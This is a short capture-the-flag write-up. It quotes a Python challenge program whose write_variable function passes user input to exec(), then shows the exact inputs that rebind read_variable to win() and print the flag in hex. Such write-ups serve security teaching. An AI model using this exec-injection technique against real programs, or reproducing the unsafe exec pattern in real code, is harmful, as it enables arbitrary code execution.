First, I connected to the listener and tested the available options by entering a random input:

```
1: print_table
2: read_variable
3: write_variable
4: getRandomNumber
```

To understand the behavior, I selected option `3` (`write_variable`).


While analyzing the source code, I noticed that there was **no `win()` function** directly visible. Based on similar previous challenges, the `win()` function is usually responsible for reading and printing the flag.

So I assumed that its functionality might be indirectly accessible through another function, such as `read_variable`.

Then I found this vulnerable function:

```python
def write_variable():
  var_name = input('Please enter variable name to write: ')
  if( filter_var_name(var_name) ):
    value = input('Please enter new value of variable: ')
    if( filter_value(value) ):
      exec('global '+var_name+'; '+var_name+' = '+value)
    else:
      print('Illegal value')
  else:
    print('Illegal variable name')
```

The key issue here is the use of `exec()` with user-controlled input:

```python
exec('global '+var_name+'; '+var_name+' = '+value)
```

This allows us to overwrite variables dynamically. Since both `var_name` and `value` are user inputs, we can manipulate program behavior.

I used option `3` (`write_variable`) to overwrite an existing variable:

```
==> 3
Please enter variable name to write: read_variable
Please enter new value of variable: win
```

This effectively assigns:

```python
read_variable = win
```

Now, when I selected option `2` (`read_variable`), it actually executed `win()`:

```
==> 2
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b ...
```

Decode it using Cyberchef, you will get the flag man :D
